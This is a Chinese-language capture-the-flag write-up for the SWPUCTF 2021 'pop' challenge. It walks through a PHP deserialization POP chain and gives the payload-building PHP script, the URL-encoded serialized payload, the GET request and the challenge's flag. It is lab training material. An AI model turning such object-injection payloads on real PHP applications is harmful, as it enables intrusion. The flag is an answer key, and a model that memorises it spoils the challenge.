---
title: "[SWPUCTF 2021 新生赛] pop"
date: 2026-05-18
category: WEB
tags:
  - PHP
  - 反序列化
  - POP链
NSSCTF: https://www.nssctf.cn/problem/437
---

# [SWPUCTF 2021 新生赛] pop

## 题目信息

- **URL**: `http://node7.anna.nssctf.cn:22982/`
- **类型**: PHP 反序列化 POP 链
- **核心考点**: `__destruct` → `__toString` → 方法调用的链式构造

## 源码

```php
<?php
error_reporting(0);
show_source("index.php");

class w44m{
    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);
?>
```

## POP 链分析

### 目标

调用 `w44m::Getflag()`，并满足条件：
- `$this->admin === 'w44m'`
- `$this->passwd === '08067'`

### 链式构造（反推）

```
w44m::Getflag()  ←  w33m::__toString()  ←  w22m::__destruct()
```

| 步骤 | 类 | 魔术方法 | 触发条件 | 作用 |
|------|-----|---------|---------|------|
| 1 | `w22m` | `__destruct()` | 对象销毁时（反序列化后自动触发） | `echo $this->w00m` |
| 2 | `w33m` | `__toString()` | 对象被当作字符串使用时（echo触发） | `$this->w00m->{$this->w22m}()` |
| 3 | `w44m` | `Getflag()` | 被动态调用时 | 包含 `flag.php` 并输出 `$flag` |

### 对象关系

```
w22m.w00m = w33m 对象
    └── w33m.w00m = w44m 对象（admin='w44m', passwd='08067'）
    └── w33m.w22m = 'Getflag'
```

## EXP

### Step 1：构造序列化 Payload

```php
<?php
class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;
}

$a = new w22m();
$b = new w33m();
$c = new w44m();

$a->w00m = $b;
$b->w00m = $c;
$b->w22m = 'Getflag';

echo urlencode(serialize($a));
?>
```

输出：
```
O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
```

**注意**：`w44m` 中的 `private` 和 `protected` 属性序列化后包含不可见字符（`\x00`），必须通过 URL 编码传输，否则会被截断或丢失。

### Step 2：传参获取 Flag

```
GET /?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
```

## Flag

```
NSSCTF{8acf5387-a399-40c8-8a45-2680afa769d4}
```

## 总结

- **POP 链的核心是找入口和出口**：入口通常是 `__destruct` 或 `__wakeup`，出口是能达到恶意目的的方法（如本题 `Getflag`）
- **中间节点利用魔术方法搭桥**：`echo` 对象触发 `__toString`，`__toString` 中动态调用方法 `$this->w00m->{$this->w22m}()`
- **访问修饰符的坑**：`private` 和 `protected` 属性序列化后带 `\x00` 前缀，直接复制粘贴会丢失，必须用 `urlencode` 编码后传输
